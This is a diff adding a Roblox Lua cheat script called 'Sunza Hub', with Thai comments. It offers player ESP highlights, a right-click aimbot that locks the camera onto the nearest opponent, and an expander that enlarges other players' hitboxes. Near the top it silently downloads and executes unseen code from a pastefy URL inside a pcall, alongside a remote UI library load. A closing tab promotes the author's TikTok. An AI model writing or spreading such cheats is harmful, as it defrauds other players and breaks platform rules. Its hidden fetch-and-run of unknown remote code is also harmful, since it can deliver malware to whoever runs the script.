@@ -1,0 +1,261 @@
+-- โหลด Rayfield UI Library
+local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
+
+-- โหลด External Script ตามที่ขอ
+task.spawn(function()
+    pcall(function()
+        loadstring(game:HttpGet("https://pastefy.app/ItfO0tdg/raw"))()
+    end)
+end)
+
+-- สร้าง Window หลัก
+local Window = Rayfield:CreateWindow({
+   Name = "Sunza Hub | ESP, Aimbot & Hitbox",
+   LoadingTitle = "Sunza Hub Loading...",
+   LoadingSubtitle = "by Sunza",
+   ConfigurationSaving = { Enabled = false },
+   Discord = { Enabled = false },
+   KeySystem = false
+})
+
+------------------------------------------------------------------
+-- VARIABLES & SERVICES
+------------------------------------------------------------------
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+local Camera = workspace.CurrentCamera
+local RunService = game:GetService("RunService")
+local UserInputService = game:GetService("UserInputService")
+
+-- ESP Variables
+local ESP_Enabled = false
+local ESP_Highlights = {}
+
+-- Aimbot Variables
+local Aimbot_Enabled = false
+local FOV_Radius = 100
+local FOV_Visible = true
+
+-- Hitbox Variables
+local Hitbox_Enabled = false
+local Hitbox_Size = 5
+
+------------------------------------------------------------------
+-- TAB 1: Main (ฟังก์ชัน ESP, Aimbot, Hitbox)
+------------------------------------------------------------------
+local MainTab = Window:CreateTab("Main Features", 4483362458)
+
+-- ================= ESP SECTION =================
+MainTab:CreateSection("ESP Player")
+
+local function ApplyESP(player)
+    if player == LocalPlayer then return end
+    
+    local function AddHighlight(character)
+        if not character then return end
+        
+        if character:FindFirstChild("SunzaESP") then
+            character.SunzaESP:Destroy()
+        end
+        
+        local highlight = Instance.new("Highlight")
+        highlight.Name = "SunzaESP"
+        highlight.Adornee = character
+        highlight.FillColor = Color3.fromRGB(255, 0, 0)
+        highlight.FillTransparency = 0.5
+        highlight.OutlineColor = Color3.fromRGB(255, 255, 255)
+        highlight.OutlineTransparency = 0
+        highlight.Enabled = ESP_Enabled
+        highlight.Parent = character
+        
+        ESP_Highlights[player] = highlight
+    end
+
+    if player.Character then
+        AddHighlight(player.Character)
+    end
+
+    player.CharacterAdded:Connect(function(char)
+        task.wait(0.5)
+        if ESP_Enabled then
+            AddHighlight(char)
+        end
+    end)
+end
+
+for _, player in pairs(Players:GetPlayers()) do
+    ApplyESP(player)
+end
+
+Players.PlayerAdded:Connect(ApplyESP)
+
+MainTab:CreateToggle({
+   Name = "ESP Player (มองเห็นผู้เล่น)",
+   CurrentValue = false,
+   Flag = "ESPToggle",
+   Callback = function(Value)
+      ESP_Enabled = Value
+      for player, highlight in pairs(ESP_Highlights) do
+         if highlight and highlight.Parent then
+            highlight.Enabled = Value
+         end
+      end
+   end,
+})
+
+-- ================= AIMBOT SECTION =================
+MainTab:CreateSection("Aimbot")
+
+-- สร้าง วงกลม FOV
+local FOVCircle = Drawing.new("Circle")
+FOVCircle.Color = Color3.fromRGB(255, 255, 255)
+FOVCircle.Thickness = 1.5
+FOVCircle.NumSides = 64
+FOVCircle.Radius = FOV_Radius
+FOVCircle.Filled = false
+FOVCircle.Visible = false
+
+MainTab:CreateToggle({
+   Name = "เปิดใช้งาน Aimbot",
+   CurrentValue = false,
+   Flag = "AimbotToggle",
+   Callback = function(Value)
+      Aimbot_Enabled = Value
+   end,
+})
+
+MainTab:CreateToggle({
+   Name = "แสดง วงกลม FOV",
+   CurrentValue = true,
+   Flag = "FOVVisibleToggle",
+   Callback = function(Value)
+      FOV_Visible = Value
+   end,
+})
+
+MainTab:CreateSlider({
+   Name = "ขนาดวงกลม Aimbot (FOV Size)",
+   Range = {30, 500},
+   Increment = 5,
+   Suffix = "px",
+   CurrentValue = 100,
+   Flag = "FOVSlider",
+   Callback = function(Value)
+      FOV_Radius = Value
+      FOVCircle.Radius = Value
+   end,
+})
+
+-- ฟังก์ชันค้นหาเป้าหมายที่ใกล้เมาส์ที่สุดในวง FOV
+local function GetClosestPlayer()
+    local closestPlayer = nil
+    local shortestDistance = FOV_Radius
+    local mousePos = UserInputService:GetMouseLocation()
+
+    for _, player in pairs(Players:GetPlayers()) do
+        if player ~= LocalPlayer and player.Character and player.Character:FindFirstChild("HumanoidRootPart") and player.Character:FindFirstChildOfClass("Humanoid").Health > 0 then
+            local pos, onScreen = Camera:WorldToViewportPoint(player.Character.HumanoidRootPart.Position)
+            if onScreen then
+                local distance = (Vector2.new(pos.X, pos.Y) - mousePos).Magnitude
+                if distance < shortestDistance then
+                    closestPlayer = player
+                    shortestDistance = distance
+                end
+            end
+        end
+    end
+    return closestPlayer
+end
+
+-- Aimbot Loop
+RunService.RenderStepped:Connect(function()
+    local mousePos = UserInputService:GetMouseLocation()
+    FOVCircle.Position = mousePos
+    FOVCircle.Visible = FOV_Visible and Aimbot_Enabled
+
+    if Aimbot_Enabled and UserInputService:IsMouseButtonPressed(Enum.UserInputType.MouseButton2) then -- กดคลิกขวาเพื่อล็อกเป้า
+        local target = GetClosestPlayer()
+        if target and target.Character and target.Character:FindFirstChild("HumanoidRootPart") then
+            Camera.CFrame = CFrame.new(Camera.CFrame.Position, target.Character.HumanoidRootPart.Position)
+        end
+    end
+end)
+
+-- ================= HITBOX SECTION =================
+MainTab:CreateSection("Hitbox Expander")
+
+MainTab:CreateToggle({
+   Name = "เปิดใช้งาน Hitbox",
+   CurrentValue = false,
+   Flag = "HitboxToggle",
+   Callback = function(Value)
+      Hitbox_Enabled = Value
+      if not Value then
+         -- คืนค่าขนาดปกติเมื่อปิด
+         for _, player in pairs(Players:GetPlayers()) do
+            if player ~= LocalPlayer and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
+               player.Character.HumanoidRootPart.Size = Vector3.new(2, 2, 1)
+               player.Character.HumanoidRootPart.Transparency = 1
+               player.Character.HumanoidRootPart.CanCollide = true
+            end
+         end
+      end
+   end,
+})
+
+MainTab:CreateSlider({
+   Name = "ขนาด Hitbox",
+   Range = {2, 50},
+   Increment = 1,
+   Suffix = " Studs",
+   CurrentValue = 5,
+   Flag = "HitboxSlider",
+   Callback = function(Value)
+      Hitbox_Size = Value
+   end,
+})
+
+-- Hitbox Loop
+RunService.RenderStepped:Connect(function()
+    if Hitbox_Enabled then
+        for _, player in pairs(Players:GetPlayers()) do
+            if player ~= LocalPlayer and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
+                pcall(function()
+                    local hrp = player.Character.HumanoidRootPart
+                    hrp.Size = Vector3.new(Hitbox_Size, Hitbox_Size, Hitbox_Size)
+                    hrp.Transparency = 0.7
+                    hrp.BrickColor = BrickColor.new("Really red")
+                    hrp.Material = Enum.Material.Neon
+                    hrp.CanCollide = false
+                end)
+            end
+        end
+    end
+end)
+
+------------------------------------------------------------------
+-- TAB 2: Creator (หน้าผู้สร้างสคริปต์ & ลิงก์ TikTok)
+------------------------------------------------------------------
+local CreatorTab = Window:CreateTab("ผู้สร้างสคริปต์", 4483362458)
+
+CreatorTab:CreateSection("ข้อมูลผู้พัฒนา")
+
+CreatorTab:CreateLabel("คนสร้างสคริปต์: Sunza")
+
+CreatorTab:CreateParagraph({
+    Title = "TikTok ผู้สร้าง",
+    Content = "https://www.tiktok.com/@sun_ggez0?_r=1&_t=ZS-98SSUSAnjHg"
+})
+
+CreatorTab:CreateButton({
+   Name = "คัดลอกลิงก์ TikTok",
+   Callback = function()
+      setclipboard("https://www.tiktok.com/@sun_ggez0?_r=1&_t=ZS-98SSUSAnjHg")
+      Rayfield:Notify({
+         Title = "สำเร็จ!",
+         Content = "คัดลอกลิงก์ TikTok ลงใน Clipboard เรียบร้อยแล้ว",
+         Duration = 3,
+         Image = 4483362458,
+      })
+   end,
+})
